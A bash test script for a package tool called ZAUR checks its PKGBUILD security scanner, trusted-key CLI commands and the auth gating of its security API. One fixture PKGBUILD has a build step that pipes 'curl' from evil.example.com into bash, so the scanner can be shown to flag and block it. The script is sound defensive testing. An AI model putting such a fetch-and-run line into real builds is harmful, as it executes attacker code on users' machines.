#!/bin/bash
# Coverage for the supply-chain security features: PKGBUILD scanner, trusted-key
# management, and the /api/security/* routes (auth gating + public findings).
set -e

cd /workspace

echo "=== ZAUR Security Feature Tests ==="

export ZAUR_DATA_ROOT="/tmp/zaur-sec-test"
export ZAUR_API_TOKEN="sec-token-12345"
rm -rf "$ZAUR_DATA_ROOT"

ZAUR="./zig-out/bin/zaur"
FAILED=0
SERVER_PID=""

cleanup() {
    if [ -n "$SERVER_PID" ] && kill -0 $SERVER_PID 2>/dev/null; then
        kill -9 $SERVER_PID 2>/dev/null || true
        wait $SERVER_PID 2>/dev/null || true
    fi
    rm -rf "$ZAUR_DATA_ROOT"
}
trap cleanup EXIT

fail() {
    echo "FAIL: $1"
    if [ -n "$2" ]; then
        echo "--- Actual ---"
        echo "$2"
        echo "--- End ---"
    fi
    FAILED=1
}
pass() { echo "PASS: $1"; }

# 1. Build
echo "[1/12] Building ZAUR..."
zig build || { fail "Build failed"; exit 1; }
pass "Build completed"

# 2. Init
echo "[2/12] Initializing..."
$ZAUR init || { fail "Init failed"; exit 1; }
pass "Init completed"

# 3. Trusted-key add
echo "[3/12] Adding a trusted key (CLI)..."
FPR="DEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF"
if $ZAUR security trust-key "$FPR" "ci-test-key" 2>&1 | grep -q "Trusted key added"; then
    pass "trust-key added fingerprint"
else
    fail "trust-key did not confirm add"
fi

# 4. Trusted-key list shows it
echo "[4/12] Listing trusted keys (CLI)..."
RESP=$($ZAUR security list-keys 2>&1)
if echo "$RESP" | grep -q "$FPR"; then
    pass "list-keys shows added fingerprint"
else
    fail "list-keys missing fingerprint" "$RESP"
fi

# 5. Trusted-key remove
echo "[5/12] Removing trusted key (CLI)..."
$ZAUR security untrust-key "$FPR" >/dev/null 2>&1
RESP=$($ZAUR security list-keys 2>&1)
if echo "$RESP" | grep -q "No trusted keys"; then
    pass "untrust-key removed fingerprint"
else
    fail "untrust-key did not remove fingerprint" "$RESP"
fi

# 6. Scanner flags a malicious PKGBUILD
echo "[6/12] Scanning a crafted malicious PKGBUILD (CLI)..."
MAL_SRC="evilpkg"
MAL_DIR="$ZAUR_DATA_ROOT/sources/$MAL_SRC"
mkdir -p "$MAL_DIR"
cat > "$MAL_DIR/PKGBUILD" <<'PKGBUILD'
pkgname=evilpkg
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=()
build() {
    curl -s https://evil.example.com/payload.sh | bash
}
package() {
    install -Dm755 evilpkg "$pkgdir/usr/bin/evilpkg"
}
PKGBUILD
RESP=$($ZAUR security scan-pkgbuild "$MAL_SRC" 2>&1)
if echo "$RESP" | grep -qi "Findings for $MAL_SRC"; then
    pass "scanner reported findings on malicious PKGBUILD"
else
    fail "scanner did not flag malicious PKGBUILD" "$RESP"
fi

# 7. Scanner blocks under enforce (critical/high present)
echo "[7/12] Verifying scanner block recommendation..."
if echo "$RESP" | grep -qi "BLOCKED under enforce"; then
    pass "scanner recommends block (critical/high)"
else
    fail "scanner did not recommend block" "$RESP"
fi

# 8. Clean PKGBUILD yields no findings
echo "[8/12] Scanning a clean PKGBUILD (CLI)..."
CLEAN_SRC="cleanpkg"
CLEAN_DIR="$ZAUR_DATA_ROOT/sources/$CLEAN_SRC"
mkdir -p "$CLEAN_DIR"
cat > "$CLEAN_DIR/PKGBUILD" <<'PKGBUILD'
pkgname=cleanpkg
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=("https://example.com/cleanpkg-1.0.tar.gz")
sha256sums=('a1b2c3d4e5f60718293a4b5c6d7e8f90112233445566778899aabbccddeeff00')
package() {
    install -Dm755 cleanpkg "$pkgdir/usr/bin/cleanpkg"
}
PKGBUILD
RESP=$($ZAUR security scan-pkgbuild "$CLEAN_SRC" 2>&1)
if echo "$RESP" | grep -qi "No findings for $CLEAN_SRC"; then
    pass "clean PKGBUILD produced no findings"
else
    fail "clean PKGBUILD unexpectedly flagged" "$RESP"
fi

# 9. Start server for API tests
echo "[9/12] Starting server..."
$ZAUR serve --port 9004 &
SERVER_PID=$!
sleep 3
if ! kill -0 $SERVER_PID 2>/dev/null; then
    fail "Server failed to start"
    exit 1
fi
pass "Server started"

# 10. Findings endpoint is public (200)
echo "[10/12] GET /api/security/findings (public)..."
RESP=$(curl -s -i http://localhost:9004/api/security/findings 2>&1)
CODE=$(echo "$RESP" | head -1 | awk '{print $2}')
if [ "$CODE" = "200" ]; then
    pass "findings endpoint public (HTTP 200)"
else
    fail "findings endpoint not public (HTTP $CODE)" "$RESP"
fi

# 11. Key management requires auth (401 without token)
echo "[11/12] GET /api/security/keys without token (expect 401)..."
RESP=$(curl -s -i http://localhost:9004/api/security/keys 2>&1)
CODE=$(echo "$RESP" | head -1 | awk '{print $2}')
if [ "$CODE" = "401" ]; then
    pass "keys endpoint requires auth (HTTP 401)"
else
    fail "keys endpoint not auth-gated (HTTP $CODE)" "$RESP"
fi

# 12. Authenticated key add + list round-trip via API
echo "[12/12] POST then GET /api/security/keys with token..."
API_FPR="CAFEBABECAFEBABECAFEBABECAFEBABECAFEBABE"
ADD=$(curl -s -i -X POST \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $ZAUR_API_TOKEN" \
    -d "{\"fingerprint\":\"$API_FPR\",\"note\":\"api-test\"}" \
    http://localhost:9004/api/security/keys 2>&1)
ADD_CODE=$(echo "$ADD" | head -1 | awk '{print $2}')
LIST=$(curl -s -H "Authorization: Bearer $ZAUR_API_TOKEN" http://localhost:9004/api/security/keys 2>&1)
if [ "$ADD_CODE" = "200" ] && echo "$LIST" | grep -q "$API_FPR"; then
    pass "API key add+list round-trip works"
else
    fail "API key round-trip failed (add HTTP $ADD_CODE)" "$LIST"
fi

# Cleanup
kill -9 $SERVER_PID 2>/dev/null || true
wait $SERVER_PID 2>/dev/null || true
SERVER_PID=""

echo ""
echo "=== Security Feature Tests Complete ==="
if [ $FAILED -eq 1 ]; then
    echo "RESULT: Some tests FAILED"
    exit 1
else
    echo "RESULT: All tests PASSED"
    exit 0
fi
